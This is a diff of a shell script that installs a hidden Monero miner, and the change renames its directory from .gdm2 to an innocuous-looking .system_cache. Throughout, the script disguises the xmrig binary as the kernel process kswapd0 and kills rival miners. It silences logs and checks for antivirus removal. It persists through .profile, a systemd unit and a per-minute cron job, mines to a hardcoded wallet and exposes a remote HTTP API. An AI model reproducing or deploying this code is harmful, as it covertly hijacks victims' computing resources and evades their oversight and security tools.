@@ -18,7 +18,7 @@ crontab -r
 killall kswapd0
 kill -9 $(/bin/ps ax -fu $USER | grep "kswapd0" | grep -v "grep" | awk '{print $2}')
 
-rm -rf $HOME/.gdm2/
+rm -rf $HOME/.system_cache/
 #rm -rf $HOME/.swapd/
 
 VERSION=2.11
@@ -140,7 +140,7 @@ fi
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/.gdm2/miner.sh script."
+echo "If needed, miner in foreground can be started by $HOME/.system_cache/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
@@ -187,22 +187,22 @@ wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_
 #gunzip -d $HOME/.gdm2/xmrig.tar.gz
 #tar xf $HOME/.gdm2/xmrig.tar
 
-echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2/"
-[ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2/
-if ! tar xzvf /tmp/xmrig.tar.gz -C $HOME/.gdm2/; then
-  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.gdm2/ directory"
+echo "[*] Unpacking xmrig.tar.gz to $HOME/.system_cache/"
+[ -d $HOME/.system_cache ] || mkdir $HOME/.system_cache/
+if ! tar xzvf /tmp/xmrig.tar.gz -C $HOME/.system_cache/; then
+  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.system_cache/ directory"
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
-$HOME/.gdm2/xmrig --help >/dev/null
+echo "[*] Checking if advanced version of $HOME/.system_cache/xmrig works fine (and not removed by antivirus software)"
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.system_cache/config.json
+$HOME/.system_cache/xmrig --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/.gdm2/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/.gdm2/xmrig is not functional"
+  if [ -f $HOME/.system_cache/xmrig ]; then
+    echo "WARNING: Advanced version of $HOME/.system_cache/xmrig is not functional"
   else
-    echo "WARNING: Advanced version of $HOME/.gdm2/xmrig was removed by antivirus (or some other problem)"
+    echo "WARNING: Advanced version of $HOME/.system_cache/xmrig was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -215,32 +215,32 @@ if (test $? -ne 0); then
     exit 1
   fi
 
-  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.gdm2/"
-  if ! tar xzvf /tmp/xmrig.tar.gz -C $HOME/.gdm2/ --strip=1; then
-    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/.gdm2/ directory"
+  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.system_cache/"
+  if ! tar xzvf /tmp/xmrig.tar.gz -C $HOME/.system_cache/ --strip=1; then
+    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/.system_cache/ directory"
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
-  $HOME/.gdm2/xmrig --help >/dev/null
+  echo "[*] Checking if stock version of $HOME/.system_cache/xmrig works fine (and not removed by antivirus software)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.system_cache/config.json
+  $HOME/.system_cache/xmrig --help >/dev/null
   if (test $? -ne 0); then
-    if [ -f $HOME/.gdm2/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/.gdm2/xmrig is not functional too"
+    if [ -f $HOME/.system_cache/xmrig ]; then
+      echo "ERROR: Stock version of $HOME/.system_cache/xmrig is not functional too"
     else
-      echo "ERROR: Stock version of $HOME/.gdm2/xmrig was removed by antivirus too"
+      echo "ERROR: Stock version of $HOME/.system_cache/xmrig was removed by antivirus too"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/.gdm2/xmrig is OK"
+echo "[*] Miner $HOME/.system_cache/xmrig is OK"
 
-mv $HOME/.gdm2/xmrig $HOME/.gdm2/kswapd0
+mv $HOME/.system_cache/xmrig $HOME/.system_cache/kswapd0
 
-rm -rf $HOME/.gdm2/config.json
-wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.gdm2/config.json
-curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.gdm2/config.json
+rm -rf $HOME/.system_cache/config.json
+wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.system_cache/config.json
+curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.system_cache/config.json
 
 echo "PASS..."
 #PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
@@ -256,34 +256,34 @@ fi
 if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.system_cache/config.json
 
 # preparing script
 
-echo "[*] Creating $HOME/.gdm2/miner.sh script"
-cat >$HOME/.gdm2/miner.sh <<EOL
+echo "[*] Creating $HOME/.system_cache/miner.sh script"
+cat >$HOME/.system_cache/miner.sh <<EOL
 #!/bin/bash
 if ! pidof kswapd0 >/dev/null; then
-  nice $HOME/.gdm2/kswapd0 \$*
+  nice $HOME/.system_cache/kswapd0 \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall kswapd0\" or \"sudo killall kswapd0\" if you want to remove background miner first."
 fi
 EOL
 
-chmod +x $HOME/.gdm2/miner.sh
+chmod +x $HOME/.system_cache/miner.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep .gdm2/miner.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/.gdm2/gdm2.rc script to $HOME/.profile"
-    echo "$HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+  if ! grep .system_cache/miner.sh $HOME/.profile >/dev/null; then
+    echo "[*] Adding $HOME/.system_cache/gdm2.rc script to $HOME/.profile"
+    echo "$HOME/.system_cache/miner.sh --config=$HOME/.system_cache/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else
-    echo "Looks like $HOME/.gdm2/miner.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/.system_cache/miner.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/.gdm2/xmrig.log file)"
-  /bin/bash $HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
+  echo "[*] Running miner in the background (see logs in $HOME/.system_cache/xmrig.log file)"
+  /bin/bash $HOME/.system_cache/miner.sh --config=$HOME/.system_cache/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
@@ -294,8 +294,8 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/.gdm2/kswapd0.log file)"
-    /bin/bash $HOME/.gdm2/miner.sh --config=$HOME/.gdm2/config_background.json >/dev/null 2>&1
+    echo "[*] Running miner in the background (see logs in $HOME/.system_cache/kswapd0.log file)"
+    /bin/bash $HOME/.system_cache/miner.sh --config=$HOME/.system_cache/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
@@ -307,7 +307,7 @@ else
 Description=GDM2
 
 [Service]
-ExecStart=$HOME/.gdm2/kswapd0 --config=$HOME/.gdm2/config.json
+ExecStart=$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -338,45 +338,45 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config_background.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.system_cache/config.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.system_cache/config_background.json"
 fi
 echo ""
 
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:10128",/' $HOME/.gdm2/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.gdm2/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.gdm2/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.gdm2/config.json
-sed -i 's#"log-file": *null,#"log-file": "'/dev/null'",#' $HOME/.gdm2/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.gdm2/config.json
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
-sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm2/config.json
+sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:10128",/' $HOME/.system_cache/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.system_cache/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.system_cache/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.system_cache/config.json
+sed -i 's#"log-file": *null,#"log-file": "'/dev/null'",#' $HOME/.system_cache/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": false,/' $HOME/.system_cache/config.json
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.system_cache/config.json
+sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.system_cache/config.json
 
-cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
-cat $HOME/.gdm2/config.json
+cp $HOME/.system_cache/config.json $HOME/.system_cache/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/.system_cache/config_background.json
+cat $HOME/.system_cache/config.json
 
 # Cronjob erstellen
 # Nur einen Cronjob hinzufügen, falls nicht vorhanden
-(crontab -l 2>/dev/null | grep -v "check_and_start.sh"; echo "* * * * * $HOME/.gdm2/check_and_start.sh") | crontab -
+(crontab -l 2>/dev/null | grep -v "check_and_start.sh"; echo "* * * * * $HOME/.system_cache/check_and_start.sh") | crontab -
 
 # Skript für den Cronjob erstellen
-cat <<'EOF' >"$HOME/.gdm2/check_and_start.sh"
+cat <<'EOF' >"$HOME/.system_cache/check_and_start.sh"
 
 #!/bin/bash
-lockfile="$HOME/.gdm2/check_and_start.lock"
+lockfile="$HOME/.system_cache/check_and_start.lock"
 
 # Locking-Mechanismus mit flock
 exec 200>"$lockfile"
 flock -n 200 || exit 1
 
-if ! pgrep -f "$HOME/.gdm2/kswapd0"; then
-  $HOME/.gdm2/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
+if ! pgrep -f "$HOME/.system_cache/kswapd0"; then
+  $HOME/.system_cache/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
 fi
 EOF
 
 # Skript ausführbar machen
-chmod +x $HOME/.gdm2/check_and_start.sh
+chmod +x $HOME/.system_cache/check_and_start.sh
 
 echo "[*] Generating ssh key on server"
 
